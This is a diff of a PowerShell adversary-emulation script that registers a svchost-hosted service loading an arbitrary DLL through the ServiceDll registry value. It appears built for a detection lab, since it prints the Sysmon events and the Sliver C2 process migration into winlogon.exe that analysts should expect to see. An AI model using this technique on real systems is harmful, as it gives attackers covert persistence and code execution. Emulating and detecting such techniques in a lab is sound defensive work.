@@ -143,13 +143,8 @@ if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
     Start-Sleep -Seconds 1
 }
 
-Invoke-Sc -ScArgs @(
-    'create', $ServiceName,
-    'type=', 'own',
-    'start=', 'demand',
-    "binPath= `"$svchost -k $GroupName`"",
-    'DisplayName=', 'C0015 Stage Service'
-)
+New-Service -Name $ServiceName -BinaryPathName "`"$svchost -k $GroupName`"" `
+    -DisplayName 'C0015 Stage Service' -StartupType Manual | Out-Null
 
 New-Item -Path "$svcKey\Parameters" -Force | Out-Null
 New-ItemProperty -Path "$svcKey\Parameters" -Name 'ServiceDll' -Value $DllPath `
@@ -166,7 +161,7 @@ Write-Host "[+] ServiceDll = $DllPath"
 Write-Host "[+] Svchost group '$GroupName' = $($members -join ',')"
 
 if ($Start) {
-    Invoke-Sc -ScArgs @('start', $ServiceName)
+    Start-Service -Name $ServiceName
     Start-Sleep -Seconds 2
 }
 
@@ -186,3 +181,5 @@ if ($svchostProc) {
 Write-Host ''
 Write-Host 'Expected afterwards: Sysmon E1 svchost.exe -> rundll32.exe <D8B3.dll>, then'
 Write-Host '  sliver> migrate --process-name winlogon.exe    (from that rundll32 session)'
+
+
